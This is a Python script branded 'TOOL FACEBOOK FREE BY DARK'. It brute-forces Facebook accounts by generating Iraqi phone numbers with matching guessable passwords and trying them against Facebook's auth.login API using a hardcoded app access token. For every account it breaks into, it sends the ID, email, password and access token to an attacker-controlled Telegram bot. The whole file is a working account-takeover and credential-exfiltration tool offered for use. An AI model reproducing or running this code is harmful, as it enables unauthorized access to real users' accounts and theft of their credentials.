import requests,sys,time,os,random,colorama
from time import sleep
import webbrowser
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;36m'
os.system('clear')
webbrowser.open('https://t.me/@duck_babaa')
logo = """\x1b[1;92mm

 ________  ____     ___   ____   ___    __  
`MMMMMMMb.`MM'     `M'  6MMMMb/ `MM    d'  @
 MM    `Mb MM       M  8P    YM  MM   d'   
 MM     MM MM       M 6M      Y  MM  d'    
 MM     MM MM       M MM         MM d'     
 MM     MM MM       M MM         MMd'      
 MM     MM MM       M MM         MMYM.     
 MM     MM MM       M MM         MM YM.    
 MM     MM YM       M YM      6  MM  YM.   
 MM    .M9  8b     d8  8b    d9  MM   YM.  
_MMMMMMM9'   YMMMMM9    YMMMM9  _MM_   YM._
                            🐥🐥
  TOOL FACEBOOK FREE BY DARK ✅
"""
logo2 = """\033[91m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
webbrowser.open('https://t.me/@duck_babaa')
print(logo)
print(logo2)
ID=input('[🐥] Enter YOUR ID TELEGRAM: ')
tok=input('[🐥] Enter TOKEN BOT TELEGRAM: ')
user = '1234567890'
def code_DARK(email,password):
    url = 'https://api.facebook.com/method/auth.login'
    headers = {
    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
    'Accept-Language' : 'en-US,en;q=0.5'
    }
    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

    req = requests.post(url, headers=headers, data=data)
    id = str(req.json()['uid'])
    con = str(req.json()['identifier'])
    tkn = str(req.json()['access_token'])
    tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.🐥. Hacked FaceBook .🐥.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> {id}\n.✉. E-mail 🐥==> {email} \n.🚫. Pass 🐥==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @duck_babaa''')
    i = requests.post(tlg)
    print(f'{G}.🐥. Hacked FaceBook .🐥.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> {id}\n.✉. E-mail 🐥==> {email} \n.🚫. Pass 🐥==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @duck_babaa')
while True:
    DARK = str("".join(random.choice(user)for i in range(7)))
    email= '+964750'+DARK
    password = '0750'+DARK
    if email =='':
        exit()
    if password =='':
        exit()
    url = 'https://api.facebook.com/method/auth.login'
    headers = {
    'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
    'Accept-Language' : 'en-US,en;q=0.5'
    }
    data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

    req = requests.post(url, headers=headers, data=data)
#    print(req.json())
    if 'access_token' in req.json():
        code_DARK(email,password)
    if '(405)' in req.json()['error_msg']:
        print(f'{S}CheckPoint {email}:{password}')
    else:
        print(f'{E}E-mail 🐥==> {email} | Pass 🐥==> {password}')